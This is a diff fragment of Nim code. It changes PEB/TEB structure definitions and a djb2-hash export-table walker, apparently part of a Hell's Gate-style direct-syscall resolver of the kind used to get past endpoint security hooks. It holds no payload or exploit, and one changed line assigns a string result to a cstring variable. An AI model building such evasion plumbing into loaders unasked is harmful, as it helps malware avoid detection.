-        Sparepointers*                          : array[4, winimport.PVOID]
-        SpareUlongs*                            : array[5, winimport.ULONG]
-        WerRegistrationData*                    : winimport.PVOID
-        WerShipAssertPtr*                       : winimport.PVOID
-        Unused*                                 : winimport.PVOID
-        ImageHeaderHash*                        : winimport.PVOID
-        TracingFlags*                           : winimport.ULONG
-        CsrServerReadOnlySharedMemoryBase*      : winimport.ULONGLONG
-        TppWorkerpListLock*                     : winimport.ULONG
-        TppWorkerpList*                         : winimport.LIST_ENTRY
-        WaitOnAddressHashTable*                 : array[0x80, winimport.PVOID]
-        TelemtryCoverageHeader*                 : winimport.PVOID
-        CloudFileFlags*                         : winimport.ULONG
-        CloudFileDiagFlags*                     : winimport.ULONG
-        PlaceholderCompatabilityMode*           : winimport.CHAR
-        PlaceholderCompatabilityModeReserved*   : array[7, winimport.CHAR]
-        LeapSecondData*                         : winimport.PVOID
-        LeapSecondFlags*                        : winimport.ULONG
-        NtGlobalFlag2*                          : winimport.ULONG
+        ProcessParameters*                      : PRTL_USER_PROCESS_PARAMETERS  
+        SubSystemData*                          : PVOID                         
+        ProcessHeap*                            : HANDLE                        
+        FastPebLock*                            : PVOID          # PRTL_CRITICAL_SECTION
+        AtlThunkSListPtr*                       : PVOID                         
+        IFEOKey*                                : PVOID                         
+        PebUnion2*                              : ULONG                         
+        Padding1*                               : array[4, UCHAR]               
+        KernelCallBackTable*                    : ptr PVOID                     
+        SystemReserved*                         : ULONG                         
+        AltThunkSListPtr32*                     : ULONG                         
+        ApiSetMap*                              : PVOID                         
+        TlsExpansionCounter*                    : ULONG                         
+        Padding2*                               : array[4, UCHAR]               
+        TlsBitmap*                              : PVOID                         
+        TlsBitmapBits*                          : array[2, ULONG]               
+        ReadOnlyShareMemoryBase*                : PVOID                         
+        SharedData*                             : PVOID                         
+        ReadOnlyStaticServerData*               : ptr PVOID                     
+        AnsiCodePageData*                       : PVOID                         
+        OemCodePageData*                        : PVOID                         
+        UnicodeCaseTableData*                   : PVOID                         
+        NumberOfProcessors*                     : ULONG                         
+        NtGlobalFlag*                           : ULONG                         
+        CriticalSectionTimeout*                 : LARGE_INTEGER                 
+        HeapSegmentReserve*                     : ULONG_PTR                     
+        HeapSegmentCommit*                      : ULONG_PTR                     
+        HeapDeCommitTotalFreeThreshold*         : ULONG_PTR                     
+        HeapDeCommitFreeBlockThreshold*         : ULONG_PTR                     
+        NumberOfHeaps*                          : ULONG                         
+        MaximumNumberOfHeaps*                   : ULONG                         
+        ProcessHeaps*                           : ptr PVOID                     
+        GdiSharedHandleTable*                   : PVOID                         
+        ProcessStarterHelper*                   : PVOID                         
+        GdiDCAttributeList*                     : ULONG                         
+        Padding3*                               : array[4, UCHAR]               
+        LoaderLock*                             : PVOID           # PRTL_CRITICAL_SECTION
+        OSMajorVersion*                         : ULONG
+        OSMinorVersion*                         : ULONG
+        OSBuildNumber*                          : USHORT
+        OSCSDVersion*                           : USHORT
+        OSPlatformId*                           : ULONG
+        ImageSubsystem*                         : ULONG
+        ImageSubsystemMajorVersion*             : ULONG
+        ImageSubsystemMinorVersion*             : ULONG
+        Padding4                                : array[4, UCHAR]
+        ActiveProcessAffinityMask*              : PVOID            # KAFFINITY
+        GdiHandleBuffer                         : array[0x3c, ULONG]
+        PostProcessInitRoutine*                 : VOID
+        TlsExpansionBitmap*                     : PVOID
+        TlsExpansionBitmapBits*                 : array[0x20, ULONG]
+        SessionId*                              : ULONG
+        Padding5*                               : array[4, UCHAR]
+        AppCompatFlags*                         : ULARGE_INTEGER
+        AppCompatFlagsUser*                     : ULARGE_INTEGER
+        ShimData*                               : PVOID
+        AppCompatInfo*                          : PVOID
+        CSDVersion*                             : UNICODE_STRING
+        ActivationContextData*                  : PVOID             # PACTIVATION_CONTEXT_DATA 
+        ProcessAssemblyStorageMap*              : PVOID             # PASSEMBLY_STORAGE_MAP
+        SystemDefaultActivationContextData*     : PVOID             # PACTIVATION_CONTEXT_DATA
+        SystemAssemblyStorageMap*               : PVOID             # PASSEMBLY_STORAGE_MAP
+        MinimumStackCommit*                     : ULONG_PTR
+        Sparepointers*                          : array[4, PVOID]
+        SpareUlongs*                            : array[5, ULONG]
+        WerRegistrationData*                    : PVOID
+        WerShipAssertPtr*                       : PVOID
+        Unused*                                 : PVOID
+        ImageHeaderHash*                        : PVOID
+        TracingFlags*                           : ULONG
+        CsrServerReadOnlySharedMemoryBase*      : ULONGLONG
+        TppWorkerpListLock*                     : ULONG
+        TppWorkerpList*                         : LIST_ENTRY
+        WaitOnAddressHashTable*                 : array[0x80, PVOID]
+        TelemtryCoverageHeader*                 : PVOID
+        CloudFileFlags*                         : ULONG
+        CloudFileDiagFlags*                     : ULONG
+        PlaceholderCompatabilityMode*           : CHAR
+        PlaceholderCompatabilityModeReserved*   : array[7, CHAR]
+        LeapSecondData*                         : PVOID
+        LeapSecondFlags*                        : ULONG
+        NtGlobalFlag2*                          : ULONG
     PPEB* = ptr PEB
 
     TEB* {.pure.} = object
-        NtTib*                                  : winimport.NT_TIB
-        EnvironmentPointer*                     : winimport.PVOID
-        ClientId*                               : winimport.CLIENT_ID
-        ActiveRpcHandle*                        : winimport.PVOID
-        ThreadLocalStoragePointer*              : winimport.PVOID
+        NtTib*                                  : NT_TIB
+        EnvironmentPointer*                     : PVOID
+        ClientId*                               : CLIENT_ID
+        ActiveRpcHandle*                        : PVOID
+        ThreadLocalStoragePointer*              : PVOID
         ProcessEnvironmentBlock*                : PEB
-        LastErrorValue*                         : winimport.ULONG
-        CountOfOwnedCriticalSections*           : winimport.ULONG
-        CsrClientThread*                        : winimport.PVOID
-        Win32ThreadInfo*                        : winimport.PVOID
-        User32Reserved*                         : array[0x1A, winimport.ULONG]
-        UserReserved*                           : array[5, winimport.ULONG]
-        WOW32Reserved*                          : winimport.PVOID
-        CurrentLocale*                          : winimport.ULONG
-        FpSoftwareStatusRegister*               : winimport.ULONG
-        ReservedForDebuggerInstrumentation*     : array[0x10, winimport.PVOID]
+        LastErrorValue*                         : ULONG
+        CountOfOwnedCriticalSections*           : ULONG
+        CsrClientThread*                        : PVOID
+        Win32ThreadInfo*                        : PVOID
+        User32Reserved*                         : array[0x1A, ULONG]
+        UserReserved*                           : array[5, ULONG]
+        WOW32Reserved*                          : PVOID
+        CurrentLocale*                          : ULONG
+        FpSoftwareStatusRegister*               : ULONG
+        ReservedForDebuggerInstrumentation*     : array[0x10, PVOID]
     PTEB* = ptr TEB
 
 
@@ -1311,7 +1517,7 @@ type
         wSysCall*    : WORD
     PHG_TABLE_ENTRY* = ptr HG_TABLE_ENTRY
 
-proc djb2_hash*(pFuncName : string) : uint64 =
+proc djb2_hash*(pFuncName : cstring) : uint64 =
 
     var hash : uint64 = 0x5381
 
@@ -1356,7 +1562,7 @@ proc getTableEntry*(pImageBase : PVOID, pCurrentExportDirectory : PIMAGE_EXPORT_
     while cx < numFuncs:    
         var 
             pFuncOrdinal    : WORD      = pAddrOfOrdinals[cx]
-            pFuncName       : string    = $(cast[PCHAR](cast[ByteAddress](pImageBase) + pAddrOfNames[cx]))
+            pFuncName       : cstring    = $(cast[PCHAR](cast[ByteAddress](pImageBase) + pAddrOfNames[cx]))
             funcHash        : uint64    = djb2_hash(pFuncName)
             funcRVA         : DWORD64   = pAddrOfFunctions[pFuncOrdinal]
             pFuncAddr       : PVOID     = cast[PVOID](cast[ByteAddress](pImageBase) + funcRVA)
